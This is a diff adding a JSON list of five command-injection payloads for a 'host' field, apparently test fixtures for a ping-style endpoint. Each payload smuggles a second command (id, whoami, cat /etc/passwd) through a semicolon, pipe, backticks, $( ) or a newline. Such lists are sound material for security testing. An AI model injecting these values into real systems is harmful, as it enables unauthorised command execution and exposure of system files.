@@ -1,0 +1,37 @@
+[
+  {
+    "id": "cmdi_001",
+    "name": "Semicolon chain",
+    "payload": "127.0.0.1; id",
+    "field": "host",
+    "description": "Chains a second command after the ping"
+  },
+  {
+    "id": "cmdi_002",
+    "name": "Pipe to whoami",
+    "payload": "127.0.0.1 | whoami",
+    "field": "host",
+    "description": "Pipes ping output to whoami"
+  },
+  {
+    "id": "cmdi_003",
+    "name": "Backtick injection",
+    "payload": "`cat /etc/passwd`",
+    "field": "host",
+    "description": "Backtick subshell execution"
+  },
+  {
+    "id": "cmdi_004",
+    "name": "Subshell dollar",
+    "payload": "$(id)",
+    "field": "host",
+    "description": "Dollar-sign subshell execution"
+  },
+  {
+    "id": "cmdi_005",
+    "name": "Newline injection",
+    "payload": "127.0.0.1\nid",
+    "field": "host",
+    "description": "Newline to inject second command"
+  }
+]
